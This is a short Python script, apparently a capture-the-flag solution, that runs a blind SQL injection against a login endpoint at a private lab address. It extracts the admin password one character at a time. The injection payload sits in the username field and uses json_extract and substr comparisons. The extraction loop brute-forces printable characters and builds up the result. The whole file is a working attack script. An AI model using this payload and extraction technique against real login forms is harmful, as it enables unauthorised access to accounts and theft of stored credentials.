import requests
import time
import tqdm


def check(pos: int, char: str) -> bool:
    url = "http://10.113.184.121:10081/login"
    data = {
        "username": f"\") AS a, json_extract(users,'$.admin.password') AS p FROM db where substr(p,{pos},1)=='{char}'  --",
        "password": "password",
    }
    try:
        r = requests.post(url, data=data)
    except Exception as e:
        if "Connection refused" in str(e):
            time.sleep(0.1)
            return check(pos, char)
        # print(type(e), e)
        # tqdm.tqdm.write(f"pos: {pos}, char: {char}")
        return False
    return True


def main():
    flag = ""
    for i in tqdm.trange(1, 100):
        for j in range(32, 128):
            if chr(j) in ["'", '"', "\\", "\n", "\r", "\t"]:
                continue
            if check(i, chr(j)):
                flag += chr(j)
                tqdm.tqdm.write(f"pos: {i}, char: {chr(j)}")
                tqdm.tqdm.write(flag)
                break
        else:
            print("Failed")
            break
    print(flag)
    return


if __name__ == "__main__":
    main()
